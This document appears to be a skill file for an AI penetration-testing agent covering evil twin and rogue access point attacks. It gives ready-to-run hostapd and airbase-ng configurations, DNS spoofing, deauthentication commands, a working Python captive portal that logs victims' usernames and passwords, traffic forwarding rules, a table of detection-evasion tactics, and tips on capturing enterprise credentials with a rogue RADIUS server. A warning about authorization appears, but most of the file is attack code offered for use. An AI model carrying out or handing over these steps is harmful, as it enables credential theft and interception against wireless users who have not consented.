---
name: Evil Twin & Rogue AP
description: Rogue access point deployment, captive portal attacks, and wireless deauthentication for network access or credential harvesting
---

# Evil Twin & Rogue AP

Pull this skill when you have physical proximity to a target wireless network (or its users) and need to deploy a fake access point to capture credentials or force clients onto your network for further attacks.

## Tool wiring

| Action | Tool | Notes |
|--------|------|-------|
| AP creation | `kali_shell` — `hostapd`, `airbase-ng` | Create a legitimate-looking AP |
| DHCP server | `kali_shell` — `dnsmasq` | Assign IPs to connecting clients |
| Captive portal | `kali_shell` — `nginx`, `nodejs`, `python3` | Host a login/update page |
| Deauth enforcement | `kali_shell` — `aireplay-ng`, `mdk4` | Disconnect clients from real AP |
| Traffic capture | `kali_shell` — `tcpdump`, `bettercap` | Capture everything clients send |
| Wi-Fi adapter setup | `kali_shell` — `airmon-ng`, `iwconfig` | Enable monitor + master mode |

> **WARNING**: Evil twin attacks are illegal without explicit authorization. The agent setting `phishing_social_engineering` must be enabled, and RoE must explicitly permit wireless social engineering.

> **Hardware note**: Many internal wireless cards cannot operate as an AP (master mode). Use an external USB adapter (Alfa AWUS036ACH, Panda PAU09) with drivers that support AP mode.

## Primer

An evil twin attack has three components:
1. **Rogue AP** — mimics the target's SSID, BSSID, and channel
2. **Deauth** — forces clients off the real AP so they connect to yours
3. **Captive portal or transparent proxy** — harvests credentials or relays traffic

## Workflow

### 1. Set up the rogue AP

#### Option A: hostapd (production-quality AP)
```bash
cat > /tmp/hostapd.conf << 'EOF'
interface=wlan0
driver=nl80211
ssid=TargetCorp-Guest
hw_mode=g
channel=6
wpa=2
wpa_passphrase=Welcome2024
wpa_key_mgmt=WPA-PSK
auth_algs=1
EOF

hostapd /tmp/hostapd.conf -B
```

#### Option B: airbase-ng (simple, flexible)
```bash
# Create a monitor-mode interface
airmon-ng start wlan0

# Set up the rogue AP (open network)
airbase-ng -e "TargetCorp-Guest" -c 6 wlan0mon

# Or with WPA (client must know the passphrase — test with posted password)
airbase-ng -e "TargetCorp-Guest" -c 6 -W 1 -z 4 wlan0mon
```

### 2. Set up DHCP and DNS
```bash
cat > /tmp/dnsmasq.conf << 'EOF'
interface=at0
dhcp-range=192.168.10.10,192.168.10.100,12h
dhcp-option=3,192.168.10.1
dhcp-option=6,8.8.8.8
address=/target.com/192.168.10.1
EOF

dnsmasq -C /tmp/dnsmasq.conf -d &
```

### 3. Deauth the real AP
```bash
# Force clients from the real AP to yours
aireplay-ng -0 5 -a REAL_AP_BSSID -c CLIENT_MAC wlan0mon

# Or broadcast deauth to all clients on that AP:
aireplay-ng -0 5 -a REAL_AP_BSSID wlan0mon

# For aggressive deauth (mdk4):
mdk4 wlan0mon d -B REAL_AP_BSSID -S
```

### 4. Set up a captive portal
```bash
# Simple credential-harvesting portal
mkdir -p /tmp/portal
cat > /tmp/portal/index.html << 'HTML'
<!DOCTYPE html>
<html><head><title>Network Login</title></head>
<body>
  <h1>Wi-Fi Login Required</h1>
  <form method="POST" action="/login">
    <input type="text" name="username" placeholder="Username"><br>
    <input type="password" name="password" placeholder="Password"><br>
    <button type="submit">Connect</button>
  </form>
</body></html>
HTML

cat > /tmp/portal/server.py << 'PYTHON'
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse, datetime

class CaptureHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        with open('/tmp/portal/index.html') as f:
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(f.read().encode())

    def do_POST(self):
        length = int(self.headers['Content-Length'])
        body = self.rfile.read(length).decode()
        params = urllib.parse.parse_qs(body)
        with open('/tmp/portal/creds.txt', 'a') as f:
            f.write(f"[{datetime.datetime.now()}] {params}\n")
        # Redirect to real site after capture
        self.send_response(302)
        self.send_header('Location', 'https://target.com')
        self.end_headers()

HTTPServer(('0.0.0.0', 80), CaptureHandler).serve_forever()
PYTHON

python3 /tmp/portal/server.py &
```

### 5. Apply iptables (internet access for victims)
```bash
# If you have internet access on the attacking machine:
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i eth0 -o at0 -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -A FORWARD -i at0 -o eth0 -j ACCEPT
```

## Attack matrix

| Variant | Goal | Setup time | Detection risk |
|---------|------|-----------|----------------|
| Open AP with portal | Credential harvesting | 10 min | Low (common in hotels/airports) |
| WPA AP with known password | Full MITM | 10 min | Low (users expect to enter password) |
| WPA AP + PMKID capture | Crack PSK offline | 5 min | Very low (no interaction) |
| Karma attack | Respond to any probe | 15 min | Medium (unusual SSID responses) |
| Known beacon SSID | Target specific network | 5 min | Low (mimics existing AP) |

## Detection avoidance

| Signal | Mitigation |
|--------|------------|
| Deauth flood | Send only 1-3 deauth packets; use `--ignore-negative-one` if channel issues |
| Duplicate BSSID | Clone the exact BSSID and channel of the real AP |
| Channel hopping | Lock onto the target's channel (`-c N`) for consistent deauth |
| Physical presence | Keep adapter antenna gain at ~2dBi to avoid triangulation |
| Captive portal IP leaks | Disable IPv6 on the rogue interface to prevent DNS leak via IPv6 |

## Validation shape

A successful evil twin attack finding should include:
- **Target**: SSID, BSSID, channel, encryption type of the impersonated AP
- **Rogue AP**: SSID, channel, encryption (open/WPA), hardware used
- **Clients connected**: MAC counts, device types (if identifiable)
- **Data captured**: Credentials, session tokens, traffic volume
- **Duration**: Start/end time of the attack
- **User interaction required**: Whether users had to enter credentials or auto-connected

## False positives

- **Clients don't auto-connect**: Many modern devices (iOS 14+, Android 10+) probe for known SSIDs but do not automatically connect to open networks without user confirmation. WPA networks with a common password are more reliable.
- **Pmkid not captured**: Not all APs broadcast PMKID in probe responses. RSN information element must include PMKID for this to work.
- **Deauth not working**: Some APs (Cisco, Aruba) have deauth protection (802.11w). Clients may ignore deauth packets. Try mdk4 or frame injection instead.
- **No internet via rogue AP**: If the attacking machine has no internet uplink, DNS lookups will fail for victims. Use local DNS spoofing to keep responses fast even without internet.

## Hand-off

- After harvesting credentials: `-> /skill/cloud/azure` or `-> /skill/cloud/aws` if enterprise creds
- After connecting clients: `-> /skill/network/arp_spoofing` for MITM on connected traffic
- For post-connection discovery: `-> /skill/tooling/nmap` to scan the local subnet from the rogue AP side
- For WPA PSK cracking: `-> /skill/wireless/wpa_cracking`

## Pro tips

- **PineAP (WiFi Pineapple)**: The Hak5 WiFi Pineapple automates this entire workflow. If you have one available, use it instead of manual setup — it provides a web UI for captive portals, filters, and deauth strategies.
- **Enterprise networks (WPA2-802.1X)**: For enterprise networks, you can set up a rogue RADIUS server (`hostapd-wpe`) that captures MSCHAPv2 credentials (which can be cracked offline with `asleap`). This works against PEAP, EAP-TTLS, and EAP-FAST.
- **iOS/Android 14+ proactive measures**: Modern OS versions use randomized MAC addresses during probing and require user confirmation to join open networks. WPA-Enterprise with a realistic SSID is more effective than open networks today.
- **Monitor channel utilization**: Use `airodump-ng` to see which channel has the most traffic. Target that channel for your rogue AP to maximize deauth success.
- **DNS hijacking**: Serve fake DNS responses pointing all domains to your portal. This ensures users see your captive portal regardless of which site they try to visit.
